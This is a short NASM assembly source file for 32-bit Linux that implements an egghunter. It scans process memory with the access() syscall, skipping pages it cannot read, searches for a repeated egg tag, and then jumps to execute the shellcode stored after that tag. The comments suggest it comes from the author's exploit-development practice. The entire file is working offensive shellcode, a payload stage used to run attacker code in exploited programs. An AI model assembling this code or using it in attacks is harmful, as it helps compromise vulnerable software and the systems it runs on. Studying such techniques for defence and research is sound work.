;
;
;
;
;

global _start

section .text
_start:

    cld                 ;clear flag
    xor edx, edx
    xor ecx, ecx        ; could use a mul instruction here instead. My other nasm egghunter has an example of mul being used

next_page:
    or dx, 0xfff        ;add 4095

egg_search:
    inc edx             ;PAGE_SIZE 4096 (Increment to 4096)

    lea ebx, [edx+0x4]  ;Align to avoid SIGSEGV

    push 0x21           ;sys_access()
    pop eax             ;eax = 0x21
    int 0x80            ;execute access()

    cmp al, 0xf2        ;Check for (f2) which is short for (0xfffffff2). 
    je next_page        ;will jump if page not accessible, return = eax (0xfffffff2)

    mov eax, 0x50905091 ;egg tag does not have to be executable, I am keeping same for all egg hunters

    mov edi, edx
    scasd               ; compare eax and edi first egg tag
    jne egg_search

    scasd               ; compare eax and edi second egg tag
    jne egg_search

    jmp edi             ; jump to shellcode and execute
